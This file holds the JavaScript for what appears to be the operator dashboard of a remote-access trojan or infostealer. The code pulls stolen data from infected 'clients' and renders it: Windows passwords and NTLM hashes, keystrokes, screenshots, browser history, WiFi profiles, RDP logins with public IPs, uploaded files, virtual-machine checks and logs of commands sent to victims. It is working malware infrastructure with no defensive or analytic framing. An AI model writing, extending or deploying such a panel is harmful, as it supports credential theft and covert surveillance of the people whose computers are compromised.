// ===== Dashboard Manager =====
class DashboardManager {
  constructor() {
    this.refreshInterval = null;
    this.isAuthenticated = true;
    this.init();
  }

  setupEventListeners() {
    // Refresh button
    const refreshBtn = document.getElementById("refresh-btn");
    if (refreshBtn) {
      refreshBtn.addEventListener("click", () => this.fetchAllData());
    }

    // Modal close buttons
    document.querySelectorAll(".modal-close").forEach((btn) => {
      btn.addEventListener("click", (e) => {
        const modal = e.target.closest(".modal");
        if (modal) this.closeModal(modal);
      });
    });

    // Close modal on outside click
    document.querySelectorAll(".modal").forEach((modal) => {
      modal.addEventListener("click", (e) => {
        if (e.target === modal) {
          this.closeModal(modal);
        }
      });
    });

    // Tab switching
    document.addEventListener("click", (e) => {
      if (e.target.classList.contains("tab")) {
        this.handleTabSwitch(e.target);
      }
    });

    // Search inputs
    document.querySelectorAll(".search-input").forEach((input) => {
      input.addEventListener("input", (e) => {
        const card = e.target.closest(".data-card");
        const content = card.querySelector(".card-content");
        this.filterEntries(content, e.target.value);
      });
    });
  }

  async init() {
    this.setupEventListeners();

    // تست اتصال اولیه
    const testResult = await this.testConnection();
    console.log("Connection test result:", testResult);

    if (testResult.success) {
      this.fetchAllData();
      this.startAutoRefresh();
    } else {
      console.error("Cannot connect to server:", testResult.error);
      this.showError("Cannot connect to server: " + testResult.error);
    }
  }

  showLoading() {
    document.getElementById("loading-overlay").classList.add("active");
  }

  hideLoading() {
    document.getElementById("loading-overlay").classList.remove("active");
  }

  async fetchAllData() {
    if (!this.isAuthenticated) {
      return;
    }

    this.showLoading();
    try {
      await Promise.all([
        this.fetchLogs(),
        this.fetchUserData(),
        this.fetchVMStatus(),
        this.fetchWifiLogs(),
        this.fetchRDPLogs(),
        this.fetchInstalledPrograms(),
        this.fetchUploadedFiles(),
        this.fetchComprehensiveBrowserData(),
        this.fetchWindowsCredentials(), // جدید
        this.fetchCredentialStatus(), // جدید
      ]);
    } catch (error) {
      console.error("Error fetching data:", error);
    } finally {
      this.hideLoading();
    }
  }

  async fetchWithAuth(url) {
    try {
      console.log("Fetching URL:", url);

      const response = await fetch(url, {
        credentials: "include",
        headers: {
          Accept: "application/json",
          "Cache-Control": "no-cache",
        },
      });

      console.log("Response status:", response.status);

      if (response.status === 401) {
        this.isAuthenticated = false;
        console.warn("Authentication required, reloading page...");
        setTimeout(() => {
          window.location.reload();
        }, 1000);
        throw new Error("Authentication required");
      }

      if (!response.ok) {
        const errorText = await response.text();
        console.error("HTTP error response:", errorText);
        throw new Error(
          `HTTP error! status: ${
            response.status
          }, response: ${errorText.substring(0, 200)}`
        );
      }

      // Check content type
      const contentType = response.headers.get("content-type");
      console.log("Content-Type:", contentType);

      if (!contentType || !contentType.includes("application/json")) {
        const text = await response.text();
        console.error(
          "Expected JSON but got:",
          contentType,
          "Content:",
          text.substring(0, 500)
        );
        throw new Error(`Expected JSON but got: ${contentType}`);
      }

      // Try to parse JSON
      const text = await response.text();
      console.log("Raw response text length:", text.length);

      if (!text.trim()) {
        throw new Error("Empty response from server");
      }

      try {
        const data = JSON.parse(text);
        return data;
      } catch (parseError) {
        console.error(
          "JSON parse error:",
          parseError,
          "Text sample:",
          text.substring(0, 500)
        );
        throw new Error(`JSON parse error: ${parseError.message}`);
      }
    } catch (error) {
      if (error.message === "Authentication required") {
        throw error;
      }
      console.error("Fetch error:", error);
      throw error;
    }
  }

  async fetchWindowsCredentials() {
    try {
      const data = await this.fetchWithAuth("?get_windows_credentials");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      this.renderWindowsCredentials(
        "windows-credentials",
        data.windows_credentials
      );
    } catch (error) {
      if (error.message === "Authentication required") return;
      console.error("Error fetching windows credentials:", error);
      this.showError("Failed to fetch windows credentials");
    }
  }

  async fetchCredentialStatus() {
    try {
      const data = await this.fetchWithAuth("?get_credential_status");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      this.renderCredentialStatus("credential-status", data.credential_status);
    } catch (error) {
      if (error.message === "Authentication required") return;
      console.error("Error fetching credential status:", error);
      this.showError("Failed to fetch credential status");
    }
  }

  renderWindowsCredentials(containerId, data) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (data.length === 0) {
      container.innerHTML = this.getEmptyState("No windows credentials found");
      return;
    }

    container.innerHTML = data
      .map((item) => this.createCredentialEntry(item))
      .join("");
  }

  renderCredentialStatus(containerId, data) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (data.length === 0) {
      container.innerHTML = this.getEmptyState("No credential status logs");
      return;
    }

    container.innerHTML = data
      .map((item) => this.createCredentialStatusEntry(item))
      .join("");
  }

  createCredentialEntry(credential) {
    const statusClass = credential.password
      ? "status-completed"
      : "status-pending";
    const statusText = credential.password ? "Password" : "Hash Only";

    return `
        <div class="entry-item" data-type="credential" data-info='${JSON.stringify(
          credential
        ).replace(
          /'/g,
          "&#39;"
        )}' onclick="dashboard.openCredentialModal(this)">
            <div class="entry-header">
                <span class="entry-time">${new Date(
                  credential.created_at
                ).toLocaleString()}</span>
                <span class="entry-status ${statusClass}">${statusText}</span>
            </div>
            <div class="entry-content">
                <p><strong>Client:</strong> ${credential.client_id}</p>
                <p><strong>User:</strong> ${credential.username || "N/A"}</p>
                <p><strong>Domain:</strong> ${credential.domain || "N/A"}</p>
                <p><strong>Type:</strong> ${credential.credential_type}</p>
                ${
                  credential.password
                    ? `<p><strong>Password:</strong> ${this.escapeHtml(
                        credential.password
                      )}</p>`
                    : ""
                }
                ${
                  credential.ntlm_hash
                    ? `<p><strong>NTLM:</strong> ${credential.ntlm_hash}</p>`
                    : ""
                }
            </div>
        </div>
    `;
  }

  createCredentialStatusEntry(status) {
    const statusClass =
      status.status === "success"
        ? "status-completed"
        : status.status === "error"
        ? "status-failed"
        : "status-pending";

    return `
        <div class="entry-item">
            <div class="entry-header">
                <span class="entry-time">${new Date(
                  status.created_at
                ).toLocaleString()}</span>
                <span class="entry-status ${statusClass}">${
      status.status
    }</span>
            </div>
            <div class="entry-content">
                <p><strong>Client:</strong> ${status.client_id}</p>
                <p><strong>Credentials Found:</strong> ${
                  status.credentials_found
                }</p>
                <p><strong>Passwords:</strong> ${status.passwords_found}</p>
                <p><strong>Hashes:</strong> ${status.hashes_found}</p>
                <p><strong>Message:</strong> ${this.escapeHtml(
                  status.message
                )}</p>
            </div>
        </div>
    `;
  }

  openCredentialModal(element) {
    const credential = JSON.parse(element.getAttribute("data-info"));

    // ایجاد مودال مخصوص credential (می‌توانید از مودال‌های موجود استفاده کنید)
    this.openDataModal(element); // استفاده از مودال موجود به صورت موقت
  }

  safeJsonParse(str) {
    try {
      return JSON.parse(str);
    } catch (error) {
      console.error(
        "JSON parse error:",
        error,
        "String:",
        str.substring(0, 200)
      );
      // Return a safe fallback object
      return {
        client_id: "Unknown",
        command: "Invalid JSON data",
        status: "error",
        result: "Data contains invalid JSON: " + error.message,
        created_at: new Date().toISOString(),
      };
    }
  }

  async fetchComprehensiveBrowserData() {
    try {
      const data = await this.fetchWithAuth("?get_comprehensive_browser_data");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      this.renderComprehensiveBrowserData(
        "comprehensive-browser-data",
        data.comprehensive_browser_data
      );
    } catch (error) {
      if (error.message === "Authentication required") return;
      console.error("Error fetching comprehensive browser data:", error);
      this.showError("Failed to fetch comprehensive browser data");
    }
  }

  renderComprehensiveBrowserData(containerId, data) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (data.length === 0) {
      container.innerHTML = this.getEmptyState("No comprehensive browser data");
      return;
    }

    container.innerHTML = data
      .map((item) => this.createBrowserDataEntry(item))
      .join("");
  }

  createBrowserDataEntry(data) {
    const browsers = [];
    if (data.chrome_data) browsers.push("Chrome");
    if (data.firefox_data) browsers.push("Firefox");
    if (data.edge_data) browsers.push("Edge");

    let stats = "";
    if (data.chrome_data) {
      const chrome = data.chrome_data;
      stats += `Chrome: ${chrome.history?.length || 0} history, ${
        chrome.bookmarks?.length || 0
      } bookmarks`;
    }

    return `
        <div class="entry-item" data-type="browser_comprehensive" data-info='${JSON.stringify(
          data
        ).replace(
          /'/g,
          "&#39;"
        )}' onclick="dashboard.openBrowserDataModal(this)">
            <div class="entry-header">
                <span class="entry-time">${new Date(
                  data.collected_at
                ).toLocaleString()}</span>
                <span class="entry-status status-completed">${
                  browsers.length
                } Browsers</span>
            </div>
            <div class="entry-content">
                <p><strong>Client:</strong> ${data.client_id}</p>
                <p><strong>Browsers:</strong> ${browsers.join(", ")}</p>
                <p><strong>Stats:</strong> ${stats}</p>
            </div>
        </div>
    `;
  }

  async testConnection() {
    try {
      console.log("Testing server connection...");
      const testUrl = "?get_logs&test=" + Date.now();
      const response = await fetch(testUrl, {
        credentials: "include",
        headers: {
          Accept: "application/json",
        },
      });

      const text = await response.text();
      console.log("Test response:", {
        status: response.status,
        contentType: response.headers.get("content-type"),
        textLength: text.length,
      });

      return { success: true, status: response.status, text };
    } catch (error) {
      console.error("Connection test failed:", error);
      return { success: false, error: error.message };
    }
  }

  async fetchLogs() {
    try {
      const data = await this.fetchWithAuth("?get_logs");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      const completed = [];
      const pending = [];
      const failed = [];

      data.logs.forEach((log) => {
        if (log.status === "completed") completed.push(log);
        else if (log.status === "pending") pending.push(log);
        else if (log.status === "failed") failed.push(log);
      });

      this.renderLogs("completed-logs", completed, "log");
      this.renderLogs("pending-logs", pending, "log");
      this.renderLogs("failed-logs", failed, "log");

      this.updateStats("completed-count", completed.length);
      this.updateStats("pending-count", pending.length);
      this.updateStats("failed-count", failed.length);
    } catch (error) {
      if (error.message === "Authentication required") {
        return;
      }
      console.error("Error fetching logs:", error);
      this.showError("Failed to fetch logs");
    }
  }

  async fetchUserData() {
    try {
      const data = await this.fetchWithAuth("?get_user_data");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      this.renderUserData("client-data", data.user_data);
      this.updateStats("data-count", data.user_data.length);
    } catch (error) {
      if (error.message === "Authentication required") return;
      console.error("Error fetching user data:", error);
      this.showError("Failed to fetch user data");
    }
  }

  async fetchVMStatus() {
    try {
      const data = await this.fetchWithAuth("?get_vm_status");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      this.renderVMStatus("vm-status", data.vm_status);
    } catch (error) {
      if (error.message === "Authentication required") return;
      console.error("Error fetching VM status:", error);
      this.showError("Failed to fetch VM status");
    }
  }

  async fetchWifiLogs() {
    try {
      const data = await this.fetchWithAuth("?get_wifi_logs");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      this.renderWifiLogs("wifi-logs", data.wifi_logs);
    } catch (error) {
      if (error.message === "Authentication required") return;
      console.error("Error fetching WiFi logs:", error);
      this.showError("Failed to fetch WiFi logs");
    }
  }

  async fetchRDPLogs() {
    try {
      const data = await this.fetchWithAuth("?get_rdp_logs");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      this.renderRDPLogs("rdp-logs", data.rdp_logs);
    } catch (error) {
      if (error.message === "Authentication required") return;
      console.error("Error fetching RDP logs:", error);
      this.showError("Failed to fetch RDP logs");
    }
  }

  async fetchInstalledPrograms() {
    try {
      const data = await this.fetchWithAuth("?get_installed_programs");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      this.renderInstalledPrograms(
        "installed-programs",
        data.installed_programs
      );
    } catch (error) {
      if (error.message === "Authentication required") return;
      console.error("Error fetching installed programs:", error);
      this.showError("Failed to fetch installed programs");
    }
  }

  async fetchUploadedFiles() {
    try {
      const data = await this.fetchWithAuth("?get_uploaded_files");

      if (data.error) {
        console.error("Error:", data.error);
        return;
      }

      this.renderUploadedFiles("uploaded-files", data.file_logs);
    } catch (error) {
      if (error.message === "Authentication required") return;
      console.error("Error fetching uploaded files:", error);
      this.showError("Failed to fetch uploaded files");
    }
  }

  showError(message) {
    console.error("Dashboard Error:", message);
    // می‌توانید اینجا یک notification به کاربر نشان دهید
  }

  renderLogs(containerId, logs, type) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (logs.length === 0) {
      container.innerHTML = this.getEmptyState("No logs found");
      return;
    }

    container.innerHTML = logs
      .map((log) => this.createLogEntry(log, type))
      .join("");
  }

  renderUserData(containerId, data) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (data.length === 0) {
      container.innerHTML = this.getEmptyState("No data found");
      return;
    }

    container.innerHTML = data
      .map((item) => this.createDataEntry(item))
      .join("");
  }

  renderVMStatus(containerId, data) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (data.length === 0) {
      container.innerHTML = this.getEmptyState("No VM status data");
      return;
    }

    container.innerHTML = data.map((item) => this.createVMEntry(item)).join("");
  }

  renderWifiLogs(containerId, data) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (data.length === 0) {
      container.innerHTML = this.getEmptyState("No WiFi data");
      return;
    }

    container.innerHTML = data
      .map((item) => this.createWifiEntry(item))
      .join("");
  }

  renderRDPLogs(containerId, data) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (data.length === 0) {
      container.innerHTML = this.getEmptyState("No RDP data");
      return;
    }

    container.innerHTML = data
      .map((item) => this.createRDPEntry(item))
      .join("");
  }

  renderInstalledPrograms(containerId, data) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (data.length === 0) {
      container.innerHTML = this.getEmptyState("No programs data");
      return;
    }

    container.innerHTML = data
      .map((item) => this.createProgramEntry(item))
      .join("");
  }

  renderUploadedFiles(containerId, data) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (data.length === 0) {
      container.innerHTML = this.getEmptyState("No uploaded files");
      return;
    }

    container.innerHTML = data
      .map((item) => this.createFileEntry(item))
      .join("");
  }

  createLogEntry(log, type) {
    const statusClass = `status-${log.status}`;
    const truncatedResult = log.result
      ? log.result.length > 100
        ? log.result.substring(0, 100) + "..."
        : log.result
      : "No result";

    // Safe JSON stringification with error handling
    let safeJson = "{}";
    try {
      safeJson = JSON.stringify(log).replace(/'/g, "&#39;");
    } catch (error) {
      console.error("JSON stringify error for log:", log);
      safeJson = JSON.stringify({
        id: log.id,
        client_id: log.client_id,
        status: log.status,
        command: "Invalid data",
        result: "JSON encoding failed",
      }).replace(/'/g, "&#39;");
    }

    return `
        <div class="entry-item" data-type="${type}" data-log='${safeJson}' onclick="dashboard.openLogModal(this)">
            <div class="entry-header">
                <span class="entry-time">${new Date(
                  log.created_at
                ).toLocaleString()}</span>
                <span class="entry-status ${statusClass}">${log.status}</span>
            </div>
            <div class="entry-content">
                <p><strong>Client:</strong> ${log.client_id || "Unknown"}</p>
                <p><strong>Command:</strong> ${this.escapeHtml(
                  log.command || "No command"
                )}</p>
                <p><strong>Result:</strong> ${this.escapeHtml(
                  truncatedResult
                )}</p>
            </div>
        </div>
    `;
  }

  createDataEntry(data) {
    return `
            <div class="entry-item" data-type="data" data-info='${JSON.stringify(
              data
            ).replace(/'/g, "&#39;")}' onclick="dashboard.openDataModal(this)">
                <div class="entry-header">
                    <span class="entry-time">${new Date(
                      data.created_at
                    ).toLocaleString()}</span>
                </div>
                <div class="entry-content">
                    <p><strong>Client:</strong> ${data.client_id}</p>
                    <p><strong>Keystrokes:</strong> ${
                      data.keystrokes
                        ? data.keystrokes.length > 50
                          ? data.keystrokes.substring(0, 50) + "..."
                          : data.keystrokes
                        : "None"
                    }</p>
                    <p><strong>Screenshot:</strong> ${
                      data.screenshot_url ? "✓ Available" : "✗ None"
                    }</p>
                </div>
            </div>
        `;
  }

  createVMEntry(data) {
    let vmData;
    try {
      vmData = JSON.parse(data.vm_details);
    } catch {
      vmData = { is_vm: false };
    }
    const isVM = vmData.is_vm;
    const statusText = isVM ? "🔍 Virtual Machine" : "✅ Physical Machine";
    const statusClass = isVM ? "status-failed" : "status-completed";

    return `
            <div class="entry-item">
                <div class="entry-header">
                    <span class="entry-time">${new Date(
                      data.created_at
                    ).toLocaleString()}</span>
                    <span class="entry-status ${statusClass}">${statusText}</span>
                </div>
                <div class="entry-content">
                    <p><strong>Client:</strong> ${data.client_id}</p>
                    <p><strong>Details:</strong> ${data.vm_details.substring(
                      0,
                      80
                    )}...</p>
                </div>
            </div>
        `;
  }

  createWifiEntry(data) {
    let wifiData;
    try {
      wifiData = JSON.parse(data.message);
    } catch {
      wifiData = { wifi_profiles: [] };
    }
    const count = wifiData.wifi_profiles ? wifiData.wifi_profiles.length : 0;

    return `
            <div class="entry-item" data-type="wifi" data-info='${JSON.stringify(
              data
            ).replace(/'/g, "&#39;")}' onclick="dashboard.openWifiModal(this)">
                <div class="entry-header">
                    <span class="entry-time">${new Date(
                      data.created_at
                    ).toLocaleString()}</span>
                    <span class="entry-status status-completed">${count} Networks</span>
                </div>
                <div class="entry-content">
                    <p><strong>Client:</strong> ${data.client_id}</p>
                    <p><strong>WiFi Profiles:</strong> ${count} found</p>
                </div>
            </div>
        `;
  }

  createRDPEntry(data) {
    let rdpData;
    try {
      rdpData = JSON.parse(data.message);
    } catch {
      rdpData = { status: "unknown" };
    }
    const status = rdpData.username ? "Enabled" : "Failed";
    const statusClass = rdpData.username ? "status-completed" : "status-failed";

    return `
            <div class="entry-item" data-type="rdp" data-info='${JSON.stringify(
              data
            ).replace(/'/g, "&#39;")}' onclick="dashboard.openRDPModal(this)">
                <div class="entry-header">
                    <span class="entry-time">${new Date(
                      data.created_at
                    ).toLocaleString()}</span>
                    <span class="entry-status ${statusClass}">${status}</span>
                </div>
                <div class="entry-content">
                    <p><strong>Client:</strong> ${data.client_id}</p>
                    <p><strong>IP:</strong> ${rdpData.public_ip || "N/A"}</p>
                    <p><strong>Username:</strong> ${
                      rdpData.username || "N/A"
                    }</p>
                </div>
            </div>
        `;
  }

  createProgramEntry(data) {
    let programData;
    try {
      programData = JSON.parse(data.program_data);
    } catch {
      programData = [];
    }
    const count = programData.length;

    return `
            <div class="entry-item" data-type="program" data-info='${JSON.stringify(
              data
            ).replace(
              /'/g,
              "&#39;"
            )}' onclick="dashboard.openProgramModal(this)">
                <div class="entry-header">
                    <span class="entry-time">${new Date(
                      data.created_at
                    ).toLocaleString()}</span>
                    <span class="entry-status status-completed">${count} Programs</span>
                </div>
                <div class="entry-content">
                    <p><strong>Client:</strong> ${data.client_id}</p>
                    <p><strong>Installed:</strong> ${count} applications</p>
                </div>
            </div>
        `;
  }

  createFileEntry(data) {
    const fileData = data.file_data || {};
    return `
            <div class="entry-item">
                <div class="entry-header">
                    <span class="entry-time">${new Date(
                      data.created_at
                    ).toLocaleString()}</span>
                    <span class="entry-status status-completed">File</span>
                </div>
                <div class="entry-content">
                    <p><strong>Client:</strong> ${data.client_id}</p>
                    <p><strong>Filename:</strong> ${
                      fileData.filename || "Unknown"
                    }</p>
                    ${
                      data.file_url
                        ? `<a href="${data.file_url}" download class="text-yellow-400 hover:underline">Download</a>`
                        : '<p class="text-red-400">Unavailable</p>'
                    }
                </div>
            </div>
        `;
  }

  getEmptyState(message) {
    return `
            <div class="empty-state">
                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"/>
                </svg>
                <p>${message}</p>
            </div>
        `;
  }

  openLogModal(element) {
    try {
      const logData = element.getAttribute("data-log");
      const log = this.safeJsonParse(logData);

      const modal = document.getElementById("log-modal");
      if (!modal) {
        console.error("Log modal not found");
        return;
      }

      document.getElementById("log-modal-client-id").textContent =
        log.client_id || "Unknown";
      document.getElementById("log-modal-command").textContent =
        log.command || "No command";
      document.getElementById("log-modal-status").textContent =
        log.status || "unknown";
      document.getElementById("log-modal-created-at").textContent =
        log.created_at ? new Date(log.created_at).toLocaleString() : "N/A";
      document.getElementById("log-modal-completed-at").textContent =
        log.completed_at ? new Date(log.completed_at).toLocaleString() : "N/A";

      const result = log.result || "No result";
      document.getElementById("log-modal-result-decrypted").value = result;
      document.getElementById("log-modal-result-raw").value =
        log.raw_result || "No raw result";

      const downloadBtn = document.getElementById("log-download-log");
      if (downloadBtn && log.id) {
        downloadBtn.onclick = () =>
          (window.location.href = `?download_log&log_id=${log.id}`);
      } else {
        downloadBtn.style.display = "none";
      }

      this.openModal(modal);
    } catch (error) {
      console.error("Error opening log modal:", error);
      this.showError("Failed to open log details");
    }
  }

  openDataModal(element) {
    const data = JSON.parse(element.getAttribute("data-info"));
    const modal = document.getElementById("data-modal");

    document.getElementById("data-modal-client-id").textContent =
      data.client_id;
    document.getElementById("data-modal-created-at").textContent = new Date(
      data.created_at
    ).toLocaleString();
    document.getElementById("data-modal-keystrokes").value =
      data.keystrokes || "No keystrokes";
    document.getElementById("data-modal-system-info").value =
      data.system_info || "No system info";

    const screenshot = document.getElementById("data-modal-screenshot");
    screenshot.src = data.screenshot_url || "";
    screenshot.style.display = data.screenshot_url ? "block" : "none";

    const downloadBtn = document.getElementById("data-download-data");
    downloadBtn.onclick = () =>
      (window.location.href = `?download_user_data&data_id=${data.id}`);

    this.openModal(modal);
  }

  openWifiModal(element) {
    const data = JSON.parse(element.getAttribute("data-info"));
    const modal = document.getElementById("wifi-modal");

    document.getElementById("wifi-modal-client-id").textContent =
      data.client_id;
    document.getElementById("wifi-modal-created-at").textContent = new Date(
      data.created_at
    ).toLocaleString();
    document.getElementById("wifi-modal-content").value = data.message || "{}";

    this.openModal(modal);
  }

  openRDPModal(element) {
    const data = JSON.parse(element.getAttribute("data-info"));
    const modal = document.getElementById("rdp-modal");

    document.getElementById("rdp-modal-client-id").textContent = data.client_id;
    document.getElementById("rdp-modal-created-at").textContent = new Date(
      data.created_at
    ).toLocaleString();
    document.getElementById("rdp-modal-content").value = data.message || "{}";

    this.openModal(modal);
  }

  openProgramModal(element) {
    const data = JSON.parse(element.getAttribute("data-info"));
    const modal = document.getElementById("program-modal");

    document.getElementById("program-modal-client-id").textContent =
      data.client_id;
    document.getElementById("program-modal-created-at").textContent = new Date(
      data.created_at
    ).toLocaleString();
    document.getElementById("program-modal-content").value =
      data.program_data || "{}";

    this.openModal(modal);
  }

  openModal(modal) {
    modal.classList.add("active");
    document.body.style.overflow = "hidden";
    setTimeout(() => {
      const modalContent = modal.querySelector(".modal-content");
      if (modalContent) {
        modalContent.scrollTop = 0;
      }
      window.scrollTo({ top: 0, behavior: "smooth" });
    }, 100);
  }

  closeModal(modal) {
    modal.classList.remove("active");
    document.body.style.overflow = "";
  }

  handleTabSwitch(tab) {
    const modal = tab.closest(".modal");
    const tabs = modal.querySelectorAll(".tab");
    const tabName = tab.dataset.tab;

    tabs.forEach((t) => t.classList.remove("active"));
    tab.classList.add("active");

    modal.querySelectorAll(".editor, .screenshot-img").forEach((el) => {
      el.style.display = "none";
    });

    const targetId = modal.querySelector(
      `#${modal.id.replace("-modal", "")}-modal-${tabName}`
    );
    if (targetId) {
      targetId.style.display = "block";
    }
  }

  filterEntries(container, searchTerm) {
    const entries = container.querySelectorAll(".entry-item");
    const term = searchTerm.toLowerCase();

    entries.forEach((entry) => {
      const text = entry.textContent.toLowerCase();
      entry.style.display = text.includes(term) ? "block" : "none";
    });
  }

  updateStats(elementId, value) {
    const element = document.getElementById(elementId);
    if (element) {
      element.textContent = value;
    }
  }

  startAutoRefresh() {
    this.refreshInterval = setInterval(() => {
      this.fetchAllData();
    }, 30000);
  }

  stopAutoRefresh() {
    if (this.refreshInterval) {
      clearInterval(this.refreshInterval);
    }
  }

  escapeHtml(text) {
    const div = document.createElement("div");
    div.textContent = text;
    return div.innerHTML;
  }
}

// Initialize dashboard
const dashboard = new DashboardManager();

// Cleanup on page unload
window.addEventListener("beforeunload", () => {
  dashboard.stopAutoRefresh();
});
